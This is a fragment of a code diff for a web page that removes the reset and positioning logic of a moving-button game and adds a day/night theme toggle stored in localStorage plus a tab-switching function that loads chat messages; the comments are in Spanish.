-        scoreSpan.textContent = '0';
-        missesSpan.textContent = '0';
-        // centrar botón inicial
-        movingBtn.style.left = '50%';
-        movingBtn.style.top = '50%';
-        movingBtn.style.transform = 'translate(-50%, -50%)';
-        movingBtn.style.position = 'absolute';
-        // Ajustar después de un tiempo para que se calcule bien
-        setTimeout(() => {
-            movingBtn.style.left = 'calc(50% - 50px)';
-            movingBtn.style.top = 'calc(50% - 50px)';
-            movingBtn.style.transform = 'none';
-            moveButton();
-        }, 50);
-    }
-
-    resetBtn.addEventListener('click', resetGame);
-    // Posición inicial
-    movingBtn.style.position = 'absolute';
-    movingBtn.style.left = 'calc(50% - 50px)';
-    movingBtn.style.top = 'calc(50% - 50px)';
-    movingBtn.style.transform = 'none';
-    moveButton();
-
-    // Ajustar posición cuando cambie tamaño de ventana
-    window.addEventListener('resize', () => { moveButton(); });
+    // ========== TEMA Y MISC ==========
+    function toggleTheme(){document.body.classList.toggle('theme-night');localStorage.setItem('sys_theme',document.body.classList.contains('theme-night')?'night':'day');}
+    (function(){let saved=localStorage.getItem('sys_theme');if(saved==='night')document.body.classList.add('theme-night');})();
+    function switchTab(tabName){document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));document.getElementById('panel-'+tabName).classList.add('active');let btn=Array.from(document.querySelectorAll('.tab-btn')).find(b=>b.getAttribute('onclick')?.includes(tabName));if(btn)btn.classList.add('active');if(tabName==='chat')cargarMensajesChat();}
 </script>
 </body>
 </html>
